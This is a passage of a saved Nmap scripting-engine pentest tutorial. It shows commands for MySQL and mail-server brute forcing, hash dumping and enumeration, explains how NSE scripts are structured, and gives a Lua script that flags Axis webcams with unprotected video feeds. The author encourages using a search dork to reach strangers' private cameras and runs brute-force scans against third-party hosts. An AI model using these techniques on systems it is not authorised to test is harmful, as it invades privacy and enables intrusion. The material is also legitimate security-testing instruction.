+          attempts to use credentials found by mysql-brute or
+          mysql-empty-password.
+
+        </p><p><strong>nmap -sV –script=mysql-users
+          192.168.195.130</strong>
+
+        </p><p>Arguments like username and password can be set to find
+          databases for further post exploitation.
+
+        </p><p><strong>MySQL empty password for root access:</strong>
+
+        </p><p>It checks for MySQL servers with an empty password for root
+          or anonymous.
+
+        </p><p><strong>sudo nmap –script mysql-empty-password
+          192.168.195.130</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh2.png">
+
+        </p><p><strong>See how beautifully we got the username and
+          password. </strong>Here an attacker can do further
+          exploitation.
+
+        </p><p>Like above we can do a database audit or pentesting for
+          different database like mysql, sql server, oracle etc. A list
+          of scripts is available on NSE documentation on the Nmap
+          site.
+
+        </p><p><strong>Listing mysql server variables:</strong>
+
+        </p><p>The developer or DBA people by default forgot to set the
+          correct environment setting for the database. The following
+          can be used to retrieve the environment setting.
+
+        </p><p><span class="pardot-title">Ethical Hacking Training –
+          Resources (InfoSec)</span>
+
+        </p><p><strong>nmap -p3306 –script mysql-variables
+          localhost</strong>
+
+        </p><p><strong>Brute forcing:</strong>
+
+        </p><p>We can also use the Nmap script for bruteforcing mysql user
+          and password in case of default credentials.
+
+        </p><p><strong>nmap –script=mysql-brute localhost.</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh3.png">
+
+        </p><p><strong>Basically it checks the root and toor credentials
+          as described by image.</strong>
+
+        </p><p><strong>Dump Hashes:</strong>
+
+        </p><p>Dumps the password hashes from an MySQL server in a format
+          suitable for cracking by tools such as John the Ripper.
+          Appropriate DB privileges (root) are required. The username
+          and password arguments take precedence over credentials
+          discovered by the mysql-brute and mysql-empty-password
+          scripts.
+
+        </p><p><strong>nmap –script=mysql-dump-hashes localhost</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh4.png">
+
+        </p><p><strong>Mysql info:</strong>
+
+        </p><p>As a pentester we can get mysql info for further
+          exploitation.
+
+        </p><p><strong>nmap –script=mysql-info localhost</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh5.png">
+
+        </p><p><strong>Mysql Enumeration:</strong>
+
+        </p><p>After we get root on a remote computer, we can gather valid
+          username and additional information.
+
+        </p><p><strong>nmap –script=mysql-enum localhost</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh6.png">
+
+        </p><p><strong>It is going and going for enumeration. See the
+          next picture:</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh7.png">
+
+        </p><p><strong>Voila. We got some info right……..</strong>
+
+        </p><p><span><strong>Exploiting CVE-2012-2122</strong></span>
+
+        </p><p><strong>Remember the most serious vulnerability in mysql
+          is </strong>CVE-2012-2122, where an attacker can get root
+          access only by knowing username, and after 300 attempt of
+          password an attacker can login to the database. For more
+          information click below.
+
+        </p><p><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2122"><span>http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2122</span></a>
+
+        </p><p><a href="http://www.exploit-db.com/exploits/19092/"><span>http://www.exploit-db.com/exploits/19092/</span></a>
+
+        </p><p><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/mysql-password-verification-bypass-cve-2012-2122/"><span>http://blog.trendmicro.com/trendlabs-security-intelligence/mysql-password-verification-bypass-cve-2012-2122/</span></a>
+
+        </p><p>So we have a module in NSE for exploiting this
+          vulnerability.
+
+        </p><p><strong>nmap –script=mysql-vuln-cve2012-2122
+          localhost</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh8.png">
+
+        </p><p>Our bad luck. Port is filtered. So let’s trace the program.
+          I am thinking as a reverse engineer, so I put a debug (-d)
+          option to see more (see the above picture). It seems that
+          there is no response from victim though the port is filtered.
+          So use ninja skills to attack.
+
+        </p><p>One more thing I want to say for vul, you can search
+          shodan.
+
+        </p><p><span><strong>Pen testing mail servers</strong></span>
+
+        </p><p>Mail servers are often used by organisations and by default
+          they have known and unknown vulnerabilities. So an attacker
+          can do a mail server exploitation by using an Nmap scipt
+          engine. Moreover these organizations have default
+          configuration like credentials, services, weak string in nmp
+          etc., so let’s do our work.
+
+        </p><p>We can do the below things:
+
+        </p><ul>
+          <li>
+            <p>Discovering valid e-mail accounts using Google Search
+
+          </p></li><li>
+            <p>Detecting open relays
+
+          </p></li><li>
+            <p>Brute forcing SMTP passwords
+
+          </p></li><li>
+            <p>Enumerating users in an SMTP server
+
+          </p></li><li>
+            <p>Detecting backdoor SMTP servers
+
+          </p></li><li>
+            <p>Brute forcing IMAP passwords
+
+          </p></li><li>
+            <p>Retrieving the capabilities of an IMAP mail server
+
+          </p></li><li>
+            <p>Brute forcing POP3 passwords
+
+          </p></li><li>
+            <p>Retrieving the capabilities of a POP3 mail server
+
+          </p></li><li>
+            <p>Detecting vulnerable Exim SMTP servers version 4.70
+              through 4.75
+        </p></li></ul>
+
+        <p><strong>Discovering valid e-mail accounts using Google
+          Search</strong>
+
+        </p><p>To find valid e-mail accounts using Google Search and
+          Google Groups by using Nmap, enter the following command:
+
+        </p><p><strong>nmap -p80 –script=http-email-harvest
+          target</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh9.png">
+
+        </p><p><span><strong>Detecting open relays</strong></span>
+
+        </p><p><strong>What is Open Relay?</strong>
+
+        </p><p>An open relay in the SMTP is a type of configuration where
+          anyone on the Internet can send email through it. This used
+          to be the default configuration in many mail servers. These
+          are very popular among hackers and spammers to do spamming.
+          And these lead to attacks like MITM, or classic relay attack,
+          wherein communication with both parties is initiated by the
+          attacker who then merely relays messages between the two
+          parties without manipulating them or even necessarily reading
+          them.
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh10.gif">
+
+        </p><p>Now it is clearly mentioned in the figure that a spammer
+          can use SMTP services for Open Relay attack for spamming.
+          Nmap introduced a technique for detecting by the following
+          command:
+
+        </p><p>nmap -sV –script smtp-open-relay -v localhost
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh11.png">
+
+        </p><p><strong>Brute forcing SMTP passwords:</strong>
+
+        </p><p>Mail servers often store very sensitive information, and
+          penetration testers need to perform brute force password
+          auditing against them to check for weak passwords.
+
+        </p><p><strong>nmap -p25 -Pn –script smtp-brute target</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh12.png">
+
+        </p><p><strong>Enumerating users in an SMTP server</strong>
+
+        </p><p>E-mail accounts used as usernames are very common in web
+          applications, and finding them is a necessary task when
+          auditing mail servers. Enumerating users via SMTP commands
+          can obtain excellent results, and thanks to the Nmap
+          Scripting Engine we can automate this task.
+
+        </p><p>nmap -p25 –script smtp-enum-users target
+
+        </p><p><strong>Detecting backdoor SMTP servers</strong>
+
+        </p><p>Compromised servers might have rogue SMTP servers installed
+          and abused by spammers. System administrators can use Nmap to
+          help them monitor mail servers in their network.
+
+        </p><p>nmap -sV –script smtp-strangeport target
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh13.png">
+
+        </p><p>The above results are the answer for one of the biggest
+          companies on the Internet. See how they are vulnerable.
+
+        </p><p><strong>Brute forcing IMAP passwords:</strong>
+
+        </p><p>E-mail accounts store very sensitive information and
+          penetration testers auditing a mail server must detect weak
+          passwords that could compromise e-mail accounts and the
+          information accessible through them.
+
+        </p><p>nmap -p143 –script imap-brute target
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh14.png">
+
+        </p><p><strong>Retrieving the capabilities of an IMAP mail
+          server:</strong>
+
+        </p><p>IMAP servers may support different capabilities. There is a
+          command named CAPABILITY that allows clients to list these
+          supported mail server capabilities, and we can use Nmap to
+          automate this task.\
+
+        </p><p>nmap -p143,993 -Pn –script imap-capabilities target
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh15.png">
+
+        </p><p><strong>Brute forcing POP3 passwords</strong>
+
+        </p><p>E-mail accounts store sensitive information. Penetration
+          testers auditing mail servers must test for weak passwords
+          that could help attackers compromise important accounts. Here
+          we are auditing a POP3 protocol.
+
+        </p><p>nmap -p110 –script pop3-brute google.com
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh16.png">
+
+        </p><p>The above gives different server names that have POP3
+          implementation, which can help an attacker for further
+          exploitation.
+
+        </p><p><strong>Retrieving the capabilities of a POP3 mail
+          server</strong>
+
+        </p><p>POP3 mail servers may support different capabilities
+          defined in RFC 2449. By using a POP3 command we can list
+          them, and thanks to Nmap, we can automate this task and
+          include this service information in our scan results.
+
+        </p><p><strong>nmap -p110 –script pop3-capabilities
+          target</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh17.png">
+
+        </p><p><strong>Detecting vulnerable Exim SMTP servers version
+          4.70 through 4.75</strong>
+
+        </p><p>Exim SMTP servers 4.70 through 4.75 with DKIM enabled are
+          vulnerable to a format string bug that allows remote
+          attackers to execute code. Nmap NSE can help penetration
+          testers to detect this vulnerability remotely.
+
+        </p><p>nmap –script smtp-vuln-cve2011-1764 –script-args
+          mailfrom=&lt;Source address&gt;,mailto=&lt;Destination
+          address&gt;,domain=&lt;domain&gt; -p25,465,587 &lt;target&gt;
+
+        </p><p><span><strong>Nmap Script Engine Development
+          (NSE)</strong></span>
+
+        </p><p>So far we have learned the power of NSE and we also knew
+          how powerful this is. Nmap’s NSE can be used to develop
+          custom script while doing penetration testing of the network
+          and web applications.
+
+        </p><p>We already discussed different types of inbuilt script for
+          pentesting, so here we will not discuss more about this,
+          instead we can discuss more about developing a custom Nmap
+          Script Engine while attacking the target. Basically NSE is
+          developed by LUA scripting language.
+
+        </p><p><strong>Nmap Script Format:</strong>
+
+        </p><p>NSE scripts consist of five descriptive fields along with
+          either a port or host rule defining when the script should be
+          executed and an action block containing the actual script
+          instructions. Values can be assigned to the descriptive
+          fields just as you would assign any other Lua variables.
+          Their names must be lowercase.
+
+        </p><p><span><strong>description Field:</strong></span>
+
+        </p><p>This field describes what a script is for. Depending upon
+          the author this may be longer or shorter.
+
+        </p><p><span><strong>categories Field:</strong></span>
+
+        </p><p>This field describes which script belongs to which
+          categories. Please see below demonstration
+
+        </p><p>categories = {“default”, “discovery”, “safe”}
+
+        </p><p><span><strong>author Field:</strong></span>
+
+        </p><p>This field describes the owner of script and contact
+          information.
+
+        </p><h3><span>License</span> Field</h3>
+
+        <p>The <span>license</span> field helps ensure that we have
+          legal permission to distribute all the scripts that come with
+          Nmap. All of those scripts currently use the standard Nmap
+          license and this is optional field. They include the
+          following lines as a standard.
+
+        </p><p>license = “Same as Nmap–See <a href="http://nmap.org/book/man-legal.html"><span>http://nmap.org/book/man-legal.html</span></a>”
+
+        </p><p><strong>dependencies Field</strong>
+
+        </p><p>The dependencies field is an array containing the names of
+          scripts that should run before this script if they are also
+          selected. This is used when one script can make use of the
+          results of another. For example, most of the smb-* scripts
+          depend on smb-brute, because the accounts found by smb-brute
+          may allow the other scripts to get more information. Listing
+          a script in dependencies doesn’t cause that script to be run;
+          it still has to be selected through the –script option or
+          otherwise. Dependencies merely force an ordering among the
+          scripts that <em>are</em> selected. This is an example of a
+          dependencies table, from smb-os-discovery:
+
+        </p><p>dependencies = {“smb-brute”}
+
+        </p><h3>Rules</h3>
+
+        <p>Nmap uses the script rules to determine whether a script
+          should be run against a target. A rule is a Lua function that
+          returns either <span>true</span> or <span>false</span>.
+          The script <span>action</span> function is only performed
+          if the rule evaluates to <span>true</span>.
+
+        </p><p>A script must contain one or more of the following
+          functions that determine when the script will be run:
+
+        </p><div>
+          <table border="0">
+            <colgroup><col></colgroup>
+
+            <tbody valign="top">
+              <tr>
+                <td valign="middle"><span>prerule()</span>
+
+              </td></tr><tr>
+                <td valign="middle"><span>hostrule(host)</span>
+
+              </td></tr><tr>
+                <td valign="middle"><span>portrule(host, port)</span>
+
+              </td></tr><tr>
+                <td valign="middle"><span>postrule()</span>
+          </td></tr></tbody></table>
+        </div>
+
+        <p><span>prerule</span> scripts run once, before any hosts
+          are scanned, during the script pre-scanning phase. <span>hostrule</span> and <span>portrule</span> scripts run
+          after each batch of hosts is scanned. <span>postrule</span>
+          scripts run once after all hosts have been scanned, in the
+          script post-scanning phase. A script may run in more than one
+          phase if it has several rules.
+
+        </p><h3>Action</h3>
+
+        <p>The action is the heart of an NSE script. It contains all
+          of the instructions to be executed when the script’s prerule,
+          portrule, hostrule or postrule triggers. It is a Lua function
+          which accepts the same arguments as the rule. The return
+          value of the action value may be a table of name–value pairs,
+          a string, or <span>nil</span>, which covers Nmap API <a href="http://nmap.org/book/nse-api.html"><span>http://nmap.org/book/nse-api.html#nse-structured-output</span></a>.
+
+        </p><p><strong>Environment Variables</strong>
+
+        </p><p>Each script has its own set of environment variables:
+
+        </p><p><span>SCRIPT_PATH</span>
+
+        </p><p>Describes The script path.
+
+        </p><p><span>SCRIPT_NAME</span>
+
+        </p><p>Describes The script name. This variable can be used in
+          debug output.
+
+        </p><p><span>SCRIPT_TYPE</span>
+
+        </p><p>Since a script can have multiple rule functions, this
+          environment variable will show which rule has activated the
+          script. This would be useful if the script wants to share
+          some code between different Script Scan phases. It will take
+          one of these four string values: <span>“prerule”</span>,<span>“hostrule”</span>, <span>“portrule”</span> or
+          <span>“postrule”</span>. This variable is only available
+          during and after the evaluation of the rule functions.
+
+        </p><p><strong>Listing All Libraries:</strong>
+
+        </p><p>Lua helps a lot during development. But NSE himself have
+          inbuilt libraries for NSE development. They have their own
+          directory nselib. Some of libraries are listed below.
+          Developers can use these fields/libraries to develop their
+          custom attack scripts. The below are the few libraries.
+
+        </p><p><span>afp</span>
+
+        </p><p>This library was written by Patrik Karlsson
+          &lt;patrik@cqure.net&gt; to facilitate communication with the
+          Apple AFP Service. It is not feature complete and still
+          missing several functions.
+
+        </p><p><span>ajp</span>
+
+        </p><p>A basic AJP 1.3 implementation based on documentation
+          available from Apache mod_proxy_ajp; <a href="http://httpd.apache.org/docs/2.2/mod/mod_proxy_ajp.html"><span>http://httpd.apache.org/docs/2.2/mod/mod_proxy_ajp.html</span></a>
+
+        </p><p><span>amqp</span>
+
+        </p><p>The AMQP library provides some basic functionality for
+          retrieving information about an AMQP server’s properties.
+
+        </p><p><span>asn1</span>
+
+        </p><p>ASN.1 functions.
+
+        </p><p><span>base32</span>
+
+        </p><p>Base32 encoding and decoding. Follows RFC 4648.
+
+        </p><p><span>base64</span>
+
+        </p><p>Base64 encoding and decoding. Follows RFC 4648.
+
+        </p><p><span>bin</span>
+
+        </p><p>Pack and unpack binary data.
+
+        </p><p><span>bit</span>
+
+        </p><p>Bitwise operations on integers.
+
+        </p><p><span>bitcoin</span>
+
+        </p><p>This library implements a minimal subset of the BitCoin
+          protocol. It currently supports the version handshake and
+          processing Addr responses.
+
+        </p><p><span>bittorrent</span>
+
+        </p><p>Bittorrent and DHT protocol library which enables users to
+          read information from a torrent file, decode bencoded
+          (bittorrent encoded) buffers, find peers associated with a
+          certain torrent and retrieve nodes discovered during the
+          search for peers.
+
+        </p><p><span>bjnp</span>
+
+        </p><p>An implementation of the Canon BJNP protocol used to
+          discover and query Canon network printers and scanner
+          devices.
+
+        </p><p><span>brute</span>
+
+        </p><p>The brute library is an attempt to create a common
+          framework for performing password guessing against remote
+          services.
+
+        </p><p><span>cassandra</span>
+
+        </p><p>Library methods for handling Cassandra Thrift communication
+          as a client.
+
+        </p><p><span>citrixxml</span>
+
+        </p><p>This module was written by Patrik Karlsson and facilitates
+          communication with the Citrix XML Service. It is not feature
+          complete and is missing several functions and parameters.
+
+        </p><p><span>comm</span>
+
+        </p><p>Common communication functions for network discovery tasks
+          like banner grabbing and data exchange.
+
+        </p><p><span>creds</span>
+
+        </p><p>The credential class stores found credentials in the Nmap
+          registry.
+
+        </p><p><span>cvs</span>
+
+        </p><p>A minimal CVS (Concurrent Versions System) pserver protocol
+          implementation which currently only supports authentication.
+
+        </p><p><span>datafiles</span>
+
+        </p><p>Read and parse some of Nmap’s data files: <span>nmap-protocols</span>, <span>nmap-rpc</span>, <span>nmap-services</span>, and <span>nmap-mac-prefixes</span>.
+
+        </p><p><span>dhcp</span>
+
+        </p><p>Implement a Dynamic Host Configuration Protocol (DHCP)
+          client.
+
+        </p><p>For more libraries we can follow the below links:
+
+        </p><p><a href="http://nmap.org/book/nse-library.html"><span>http://nmap.org/book/nse-library.html</span></a>
+
+        </p><p><a href="http://nmap.org/nsedoc/"><span>http://nmap.org/nsedoc/</span></a>
+
+        </p><p><strong>Nmap API</strong>
+
+        </p><p><strong>API </strong>for Nmap is a great thing for
+          security researchers and pentesters, where a security
+          developer can define his own custom setting during scan and
+          exploitation. Nmap has learned about the target hosts. This
+          data is passed as arguments to the NSE script’s action
+          method. The arguments, host and port are Lua tables, which
+          contain information on the target against which the script is
+          executed. If a script matched a hostrule, it gets only the
+          host table, and if it matches a portrule it gets both host
+          and port.
+
+        </p><p>See the follow rules which should be maintained in the API.
+
+        </p><p>host
+
+        </p><p>This table is passed as a parameter to the rule and action
+          functions. It contains OS details.
+
+        </p><p>host.os
+
+        </p><p>it describes an array of OS match tables, and shows in the
+          follow manner. See below:
+
+        </p><pre class="brush: plain; title: ; notranslate" title="">
+host.os = {
+  {
+    name = &lt;string&gt;,----Linux 2.6/3.2
+    classes = {
+      {
+        vendor = &lt;string&gt;,------Linux
+        osfamily = &lt;string&gt;,-------Linux
+        osgen = &lt;string&gt;,------2.6.x
+        type = &lt;string&gt;,---------general purpose
+        cpe = {---------------------"cpe:/o:linux:linux_kernel:3"
+          "cpe:/&lt;...&gt;",
+          [More CPE]
+        }
+      },
+      [More classes]
+    },
+  },
+  [More OS matches]
+}
+</pre>
+
+        <p>Similarl to host.os are different sub component available
+          for Nmap API like host.ip, host.name, host.region etc. For
+          full components we can follow the link here: <a href="http://nmap.org/book/nse-api.html"><span>http://nmap.org/book/nse-api.html</span></a>.
+
+        </p><p><strong>Network API Connect:</strong>
+
+        </p><p>To allow for efficient and parallelizable network I/O, NSE
+          provides an interface to Nsock, the Nmap socket library. The
+          smart callback mechanism Nsock uses is fully transparent to
+          NSE scripts. The main benefit of NSE’s sockets is that they
+          never block on I/O operations, allowing many scripts to be
+          run in parallel.
+
+        </p><p><strong>Connect API:</strong>
+
+        </p><p>This is a part of network API which is very classical
+          during a TCP/UDP/HTTP/HTTPS connection, which is handled by
+          an irrespective NMAP library. Below is the demonstration of
+          connect API and how it is implemented:
+
+        </p><p><span>require(“nmap”)</span>
+
+        </p><p><span>local socket = nmap.new_socket()</span>
+
+        </p><p><span>socket:set_timeout(1000)</span>
+
+        </p><p><span>try = nmap.new_try(function() socket:close()
+          end)</span>
+
+        </p><p><span>try(socket:connect(host.ip, port.number))</span>
+
+        </p><p><span>try(socket:send(“login”))</span>
+
+        </p><p><span>response = try(socket:receive())</span>
+
+        </p><p><span>socket:close()</span>
+
+        </p><p><strong>Exception Handling:</strong>
+
+        </p><p>Nmap LUA language doesn’t have any exception handling
+          mechanism, so API provides great support for exception
+          handling.
+
+        </p><p><span>local result, socket, try, catch</span>
+
+        </p><p><span>result = “”</span>
+
+        </p><p><span>socket = nmap.new_socket()</span>
+
+        </p><p><span>catch = function()</span>
+
+        </p><p><span>socket:close()</span>
+
+        </p><p><span>end</span>
+
+        </p><p><span>try = nmap.new_try(catch)</span>
+
+        </p><p><span>try(socket:connect(host.ip, port.number))</span>
+
+        </p><p><span>result = try(socket:receive_lines(1))</span>
+
+        </p><p><span>try(socket:send(result))</span>
+
+        </p><p><strong>OUR FIRST NSE SCRIPT:</strong>
+
+        </p><p>So like you I am feeling bored with a lot of theory, so
+          let’s have some practical sessions. Here I will demonstrate a
+          basic NSE script.
+
+        </p><p>Please read all basic prerequisites for .nse file
+          development (<a href="http://nmap.org/book/nse-tutorial.html"><span>http://nmap.org/book/nse-tutorial.html</span></a>).
+
+        </p><p>I will automate all scanning stuff and exploiting through a
+          .nse file, you know the old days of hacking like going
+          through someone’s camera that may be private or public. The
+          most popular one is hijacking an AXIS camera. I am
+          demonstrating the technique below.
+
+        </p><p>Use the dork:  <strong>inurl:axis-cgi/jpg</strong>
+
+        </p><p>Open the URL having axis-cgi/jpg/image.cgi and you can see
+          someone’s private or public camera which is unauthorized. See
+          the example below:
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh18.png">
+
+        </p><p>So let’s exploit in the wild by Nmap NSE development. We
+          know that Axis has vulnerabilities which can be exploitable.
+          So let’s start our game:
+
+        </p><ol>
+          <li>
+            <p>Create axis.nse file and write the following code which
+              can be used for automation.
+
+            </p><p>description = [[Attempts to detect webcams AXIS
+              vulnerable to unauthenticated access to the video stream
+              by queryingthe URI ” /axis-cgi/jpg/image.cgi “.
+
+          </p></li><li>
+            <p>We load the library that is needed for our development.
+
+            </p><p>local http = require “http”
+
+            </p><p>local shortport = require “shortport”
+
+            </p><p>local stdnse = require “stdnse<span>“</span>
+
+          </p></li><li>
+            <p>We define our execution rule as below, which is for our
+              webserver that is needed by Nmap.
+
+            </p><p>portrule = shortport.http
+
+          </p></li><li>
+            <p>We determine the status whether the server is
+              vulnerable or not by sending status code 200 or 404.
+
+            </p><p>action = function(host, port)
+
+            </p><p>local uri = ” /axis-cgi/jpg/image.cgi”
+
+            </p><p>local _, status_404, resp_404 =
+              http.identify_404(host,port)
+
+            </p><p>if status_404 == 200 then
+
+            </p><p>stdnse.print_debug(1, “%s: Web server returns ambiguous
+              response. Axis webcams return standard 404 status
+              responses. Exiting.”, SCRIPT_NAME)
+
+            </p><p>return
+
+            </p><p>end
+
+            </p><p>stdnse.print_debug(1, “%s: HTTP HEAD %s”,
+              SCRIPT_NAME,uri)
+
+            </p><p>local resp = http.head(host, port, uri)
+
+            </p><p>if resp.status and resp.status == 200 then
+
+            </p><p>return string.format(“Axis video feed is
+              unprotected:http://%s/axis-cgi/jpg/image.cgi “, host.ip)
+
+            </p><p>end
+
+            </p><p>end
+        </p></li></ol>
+
+        <p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh19.png">
+
+        </p><p>See the NSE script which contains the exploit for the
+          vulnerable AXIS web camera.
+
+        </p><p>See the screenshot below. We pwned the webserver.
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh20.png">
+
+        </p><p>Pwned……………..
+
+        </p><p>Please ask questions if you have them. Until next time,
+          Good Bye::<span></span>
+
+        </p><p>I will develop more scripts in the future. You can get the
+          above scripts by the below link:
+
+        </p><p><a href="https://github.com/bikashdash/Axis_Vuln_Webcam"><span>https://github.com/bikashdash/Axis_Vuln_Webcam</span></a>
+
+        </p><p><strong>References</strong>
+
+        </p><p><a href="https://secwiki.org/w/Nmap/External_Script_Library"><span>https://secwiki.org/w/Nmap/External_Script_Library</span></a>
+
+        </p><p><a href="http://nmap.org/book/nse-tutorial.html"><span>http://nmap.org/book/nse-tutorial.html</span></a>
+      </p></article>
+    </div>
+<script src="mysql-brute_files/jquery.js"></script>
+<script src="mysql-brute_files/bootstrap.js"></script>
+
+</div>
+
+</body><span class="gr__tooltip"><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i><span class="gr__triangle"></span></span></html>
